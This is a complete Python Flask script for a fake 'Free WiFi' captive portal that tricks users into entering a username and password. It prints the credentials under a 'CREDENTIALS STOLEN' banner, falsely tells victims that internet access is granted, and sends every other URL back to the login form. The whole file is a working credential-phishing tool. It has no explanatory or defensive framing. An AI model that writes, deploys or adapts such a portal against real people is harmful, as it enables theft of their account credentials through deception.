from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

LOGIN_PAGE = """
<!doctype html>
<title>Free WiFi Login</title>
<h2>Welcome to FreeWiFi</h2>
<p>Please login to continue:</p>
<form method="POST">
    <label>Username: <input type="text" name="username"></label><br><br>
    <label>Password: <input type="password" name="password"></label><br><br>
    <input type="submit" value="Login">
</form>
"""

@app.route("/", methods=["GET", "POST"])
def portal():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        print(f"[🔥 CREDENTIALS STOLEN] Username: {username}, Password: {password}")
        return "<h3>Thank you for logging in. Internet access granted (not really).</h3>"
    return render_template_string(LOGIN_PAGE)

@app.route("/<path:anything>")
def catch_all(anything):
    return redirect("/")

if __name__ == "__main__":
    print("🚨 Fake WiFi Hotspot running at http://localhost:8082")
    app.run(host="0.0.0.0", port=8082)

